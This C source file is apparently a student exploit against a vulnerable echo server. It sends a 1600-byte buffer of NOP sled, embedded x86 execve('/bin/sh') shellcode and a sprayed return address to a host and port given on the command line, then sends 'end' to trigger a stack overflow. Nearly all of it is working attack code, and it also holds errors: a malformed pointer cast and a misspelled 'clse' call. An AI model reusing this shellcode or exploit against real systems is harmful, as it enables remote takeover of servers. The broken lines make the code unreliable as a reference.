/*
 * echo_server_exploit.c
 * Copyright (C) 2018 lhuang <lhuang9703@gmail.com>
 *
 * Distributed under terms of the MIT license.
 */

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>

char shellcode[] = 
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(int argc, char *argv[])
{
    char buf[1600];
    int s, i, size, ret;
    struct sockaddr_in remote;
    struct hostent *host;

    //fill the buffer with shellcode and 0x90 and return address
    sscanf(argv[3], "0x%x", &ret);
    memset(buf, 0x90, 1600);
    memcpy(buf + 1600 - sizeof(shellcode) - 2, shellcode, sizeof(shellcode));
    for ( i = 0; i < 90 * 4; i += 4)
    {
        *((int *)) &buf[i] = ret;
    }
    
    //send buffer
    host = gethostbyname(argv[1]);
    s = socket(AF_INET, SOCK_STREAM, 0);
    remote.sin_family = AF_INET;
    remote.sin_addr = *((struct in_addr *)host->h_addr);
    remote.sin_port = htons(atoi(argv[2]));
    if (-1 == connect(s, (struct sockaddr *)&remote, sizeof(remote)))
    {
        close(s);
        printf("fail to connect\n");
        return -1;
    }
    size = send(s, buf, sizeof(buf), 0);
    if (size < 0)
    {
        clse(s);
        printf("fail to send data\n");
        return -1;
    }
    close(s);
    
    //send "end"
    host = gethostbyname(argv[1]);
    s = socket(AF_INET, SOCK_STREAM, 0);
    remote.sin_family = AF_INET;
    remote.sin_addr = *((struct in_addr *)host->h_addr);
    remote.sin_port = htons(atoi(argv[2]));
    if (-1 == connect(s, (struct sockaddr *)&remote, sizeof(remote)))
    {
        close(s);
        printf("fail to connect\n");
        return -1;
    }
    sprintf(buf, "end\n");
    size = send(s, buf, sizeof(buf), 0);
    if (size < 0)
    {
        clse(s);
        printf("fail to send data\n");
        return -1;
    }
    close(s);
}
